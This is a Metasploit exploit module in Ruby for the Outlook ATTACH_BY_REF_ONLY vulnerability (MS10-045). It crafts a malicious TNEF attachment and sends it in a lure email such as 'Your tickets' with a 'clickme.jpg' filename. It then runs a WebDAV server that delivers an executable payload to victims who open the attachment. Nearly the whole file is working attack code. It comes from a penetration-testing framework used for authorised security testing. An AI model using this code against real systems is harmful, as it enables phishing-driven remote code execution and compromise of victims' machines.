##
# $Id: ms10_045_outlook_ref_only.rb 9922 2010-07-25 16:00:52Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	# This module acts as an HTTP server
	include Msf::Exploit::Remote::HttpServer::HTML

	# This module also sends email
	include Msf::Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Outlook ATTACH_BY_REF_ONLY File Execution',
			'Description'		=> %q{
				It has been discovered that certain e-mail message cause Outlook to create Windows
				shortcut-like attachments or messages within Outlook. Through specially crafted TNEF
				streams with certain MAPI attachment properties, it is possible to set a path name
				to files to be executed. When a user double clicks on such an attachment or message,
				Outlook will proceed to execute the file that is set by the path name value. These
				files can be local files, but also file stored remotely for example on a file share.
				Exploitation is limited by the fact that its is not possible for attackers to supply
				command line options.
			},
			'Author'		=> 'Yorick Koster <yorick@akitasecurity.nl>',
			'Version'		=> '$Revision: 9922 $',
			'References'	=>
				[
					['MSB', 'MS10-045'],
					['CVE', '2010-0266'],
					['OSVDB', '66296'],
					['BID', '41446'],
					['URL', 'http://www.akitasecurity.nl/advisory.php?id=AK20091001'],
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'Payload'        =>
				{
					'Space'       => 1024,
					'Compat'      =>
						{
							'ConnectionType' => '-bind -find',
						},

					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => [ [ 'Automatic', {} ] ],
			'DisclosureDate' => 'Jun 01 2010',
			'DefaultTarget'  => 0
		))

		register_options(
			[
				#
				# Email options
				#
				OptString.new('MESSAGECLASS',
					[false, 'Message Class value', 'IPM.Note']),
				OptString.new('FILENAME',
					[false, 'Sets the file name that is displayed in the message', 'clickme.jpg']),
				OptString.new('MAILSUBJECT',
					[false, 'The subject of the sent email', 'Your tickets']),
				OptBool.new('HTML',
					[false, 'Send email in HTML or plain text', true]),
				OptString.new('MESSAGE',
					[false, 'Email message text', 'Dear Madam, Sir,\\n\\nWe have attached your tickets to this message.\\n\\nKind regards,\\n\\nEve']),
				OptString.new('VERBOSE',
					[ false, 'Display verbose information', "true"]),
				#
				# WebDAV options
				#
				OptPort.new('SRVPORT',   [ true,  "The daemon port to listen on (do not change)", 80 ]),
				OptString.new('URIPATH', [ true,  "The URI to use (do not change).", "/" ]),
				OptString.new('UNCHOST', [ false, "The host portion of the UNC path to provide to clients (ex: 1.2.3.4)." ])
			], self.class)

		deregister_options('SSL', 'SSLVersion') # Just for now
	end

	def on_request_uri(cli, request)

		case request.method
		when 'OPTIONS'
			process_options(cli, request)
		when 'PROPFIND'
			process_propfind(cli, request)
		when 'GET'
			process_get(cli, request)
		else
			print_error("Unexpected request method encountered: #{request.method}")
			resp = create_response(404, "Not Found")
			resp.body = ""
			resp['Content-Type'] = 'text/html'
			cli.send_response(resp)
		end

	end

	def process_get(cli, request)

		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		webdav = "\\\\#{myhost}\\"

		if (request.uri =~ /\.exe$/i)
			print_status "Sending EXE payload #{cli.peerhost}:#{cli.peerport} ..."
			return if ((p = regenerate_payload(cli)) == nil)
			data = Msf::Util::EXE.to_win32pe(framework, p.encoded)
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		print_status "Sending 404  to #{cli.peerhost}:#{cli.peerport} ..."
		resp = create_response(404, "Not Found")
		resp.body = ""
		resp['Content-Type'] = 'text/html'
		cli.send_response(resp)
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		print_status("Responding to WebDAV OPTIONS request from #{cli.peerhost}:#{cli.peerport}")
		headers = {
			'MS-Author-Via' => 'DAV',
#			'DASL'          => '<DAV:sql>',
#			'DAV'           => '1, 2',
			'Allow'         => 'OPTIONS, GET, PROPFIND',
			'Public'        => 'OPTIONS, GET, PROPFIND'
		}
		resp = create_response(207, "Multi-Status")
		resp.body = ""
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end

	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		print_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport} #{path}")
		body = ''

		my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		my_uri    = "http://#{my_host}/"

		if path =~ /\.exe$/i
			# Response for the DLL
			print_status("Sending EXE multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_dll}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

			resp = create_response(207, "Multi-Status")
			resp.body = body
			resp['Content-Type'] = 'text/xml'
			cli.send_response(resp)
			return
		end

		if path !~ /\/$/

			if path.index(".")
				print_status("Sending 404 for #{path} ...")
				resp = create_response(404, "Not Found")
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			else
				print_status("Sending 301 for #{path} ...")
				resp = create_response(301, "Moved")
				resp["Location"] = path + "/"
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			end
		end

		print_status("Sending directory multistatus for #{path} ...")
		body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
	<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
		<D:href>#{path}</D:href>
		<D:propstat>
			<D:prop>
				<lp1:resourcetype><D:collection/></lp1:resourcetype>
				<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
				<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
				<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
				<D:supportedlock>
					<D:lockentry>
						<D:lockscope><D:exclusive/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
					<D:lockentry>
						<D:lockscope><D:shared/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
				</D:supportedlock>
				<D:lockdiscovery/>
				<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
			</D:prop>
		<D:status>HTTP/1.1 200 OK</D:status>
	</D:propstat>
</D:response>
|


		subdirectory = %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{Rex::Text.rand_text_alpha(6)}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|

		files = %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_exe}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
		if request["Depth"].to_i > 0
			if path.scan("/").length < 2
				body << subdirectory
			else
				body << files
			end
		end

		body << "</D:multistatus>"

		body.gsub!(/\t/, '')

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml; charset="utf8"'
		cli.send_response(resp)
	end

	def exploit

		unc = nil
		if (datastore['UNCHOST'])
			unc = datastore['UNCHOST'].dup
		else
			unc = ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])
		end

		@exploit_unc_host = unc
		@exploit_unc  = "\\\\#{unc}\\#{rand_text_alpha(rand(8)+4)}\\"
		@exploit_exe  = rand_text_alpha(rand(8)+4) + ".exe"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
		end

		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['MAILSUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		if datastore['HTML'] == true
			body = create_email_body_html(datastore['MESSAGE'], msg.subject)
			content_type = "text/html; charset=\"iso-8859-1\""
			msg.add_part(body, content_type, 'quoted-printable')
		else
			body = create_email_body(datastore['MESSAGE'])
			content_type = 'text/plain'
			msg.add_part(body, content_type, '8bit')
		end

		attachment = Rex::Text.encode_base64(create_tnef_exploit(), "\r\n")
		content_type = 'application/ms-tnef'
		content_disposition = "attachment; name=\"winmail.dat\""
		msg.add_part(attachment, content_type, 'base64', content_disposition)

		print_status("Sending message to the target...")
		send_message(msg.to_s)

		print_status("Creating WebDAV service and waiting for connections...")
		super
	end

	def create_email_body(body)
		body = body.gsub(/\\[nr]/, "\n")
		body = body.gsub(/\\t/, "\t")
		return body
	end

	def create_email_body_html(body, subject)
		body = body.gsub(/\\[nr]/, "<BR>\n")
		body = body.gsub(/\\t/, "&nbsp;&nbsp;&nbsp;")
		body = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2//EN\">\n<HTML>\n<HEAD>\n<META HTTP-EQUIV=3D\"Content-Type\" CONTENT=3D\"text/html; charset=3Diso-8859-=\n1\">\n<TITLE>" << subject << "</TITLE>\n</HEAD>\n<BODY>\n" << body << "\n<BR><BR>\n</BODY>\n</HTML>"
		return body
	end

	def create_tnef_exploit
		filename = (datastore['FILENAME'] || 'clickme.png') << "\x00"
		message_class = (datastore['MESSAGECLASS'] || 'IPM.Note') << "\x00"
		pathname = "file://#{@exploit_unc_host}/#{rand_text_alpha(rand(8)+4)}/#{@exploit_exe}\x00"
		print_status("Using UNC path: #{pathname}")

		# start of TNEF stream
		sploit = create_tnef_header

		# MAPI message properties
		msgprops = "\x04\x00\x00\x00"			# Count		4

		msgprops << "\x0b\x00"				# Type		PT_BOOLEAN
		msgprops << "\x1b\x0e"				# Name		PR_HASATTACH
		msgprops << "\x01\x00\x00\x00"			# Value data	1

		msgprops << "\x1e\x00"				# Type		PT_STRING
		msgprops << "\x1a\x00"				# Name		PR_MESSAGE_CLASS
		msgprops << "\x01\x00\x00\x00"			# Count values	1
		msgprops << [message_class.length].pack("V")	# Value length
		msgprops << mapi_pad(message_class)		# Value data

		msgprops << "\x03\x00"				# Type		PT_INT
		msgprops << "\xfe\x0f"				# Name		PR_OBJECT_TYPE
		msgprops << "\x05\x00\x00\x00"			# Value data	MAPI_MESSAGE (5)

		msgprops << "\x03\x00"				# Type		PT_INT
		msgprops << "\x07\x0e"				# Name		PR_MESSAGE_FLAGS
		msgprops << "\x12\x00\x00\x00"			# Value data	0x00000012

		# add properties to TNEF stream
		sploit << "\x01"				# Level type	LVL_MESSAGE
		sploit << "\x03\x90"				# Name		attMAPIProps (0x9003)
		sploit << "\x06\x00"				# Type		atpByte (0x0006)
		sploit << [msgprops.length].pack('V')		# Len
		sploit << msgprops
		sploit << tnef_checksum(msgprops)

		# start of TNEF attachment
		sploit << "\x02"				# Level type	LVL_ATTACHMENT
		sploit << "\x02\x90"				# Name		attAttachRenddata (0x9002)
		sploit << "\x06\x00"				# Type		atpByte (0x0006)
		sploit << "\x0e\x00\x00\x00"			# Len		0x0000000e
		sploit << "\x01\x00\xff\xff\xff\xff\x20\x00\x20\x00\x00\x00\x00\x00"
		sploit << "\x3d\x04"				# Checksum

		# MAPI attachment properties
		attprops = "\x04\x00\x00\x00"			# Count		4

		attprops << "\x1e\x00"				# Type		PT_STRING
		attprops << "\x07\x37"				# Name		PR_ATTACH_LONG_FILENAME
		attprops << "\x01\x00\x00\x00"			# Count values	1
		attprops << [filename.length].pack('V')		# Value length
		attprops << mapi_pad(filename)			# Value data

		attprops << "\x1e\x00"				# Type		PT_STRING
		attprops << "\x0d\x37"				# Name		PR_ATTACH_LONG_PATHNAME
		attprops << "\x01\x00\x00\x00"			# Count values	1
		attprops << [pathname.length].pack('V')		# Value length
		attprops << mapi_pad(pathname)			# Value data

		attprops << "\x03\x00"				# Type		PT_INT
		attprops << "\x05\x37"				# Name		PR_ATTACH_METHOD
		attprops << "\x04\x00\x00\x00"			# Value data	ATTACH_BY_REF_ONLY (4)

		attprops << "\x03\x00"				# Type		PT_INT
		attprops << "\xfe\x0f"				# Name		PR_OBJECT_TYPE
		attprops << "\x07\x00\x00\x00"			# Value data	MAPI_ATTACH (7)

		# add properties to TNEF stream
		sploit << "\x02"				# Level type	LVL_ATTACHMENT
		sploit << "\x05\x90"				# Name		attAttachment (0x800f)
		sploit << "\x06\x00"				# Type		atpByte (0x0006)
		sploit << [attprops.length].pack('V')		# Len
		sploit << attprops
		sploit << tnef_checksum(attprops)

		return sploit
	end

	def create_tnef_header
		# TNEF Header
		buf = "\x78\x9f\x3e\x22"			# Signature	0x223e9f78
		buf << "\x00\x00"				# Key

		# TNEF Attributes
		buf << "\x01"					# Level type	LVL_MESSAGE
		buf << "\x06\x90"				# Name		attTnefVersion (0x9006)
		buf << "\x08\x00"				# Type		atpDword (0x0008)
		buf << "\x04\x00\x00\x00"			# Len		0x00000004
		buf << "\x00\x00\x01\x00"
		buf << "\x01\x00"				# Checksum

		buf << "\x01"					# Level type	LVL_MESSAGE
		buf << "\x07\x90"				# Name		attOemCodepage (0x9007)
		buf << "\x06\x00"				# Type		atpByte (0x0006)
		buf << "\x08\x00\x00\x00"			# Len		0x00000008
		buf << "\xe4\x04\x00\x00\x00\x00\x00\x00"
		buf << "\xe8\x00"				# Checksum

		buf << "\x01"					# Level type	LVL_MESSAGE
		buf << "\x0d\x80"				# Name		attPriority (0x800d)
		buf << "\x04\x00"				# Type		atpShort (0x0004)
		buf << "\x02\x00\x00\x00"			# Len		0x00000002
		buf << "\x02\x00"
		buf << "\x02\x00"				# Checksum

		return buf
	end

	def tnef_checksum(buf = '')
		checksum = 0;

		buf.each_byte { |b|
			checksum += b
		}

		return [checksum % 65536].pack('v')
	end

	def mapi_pad(buf = '')
		length = (buf.length + 3) & ~3

		(buf.length..(length - 1)).each {
			buf << "\x00"
		}

		return buf
	end
end

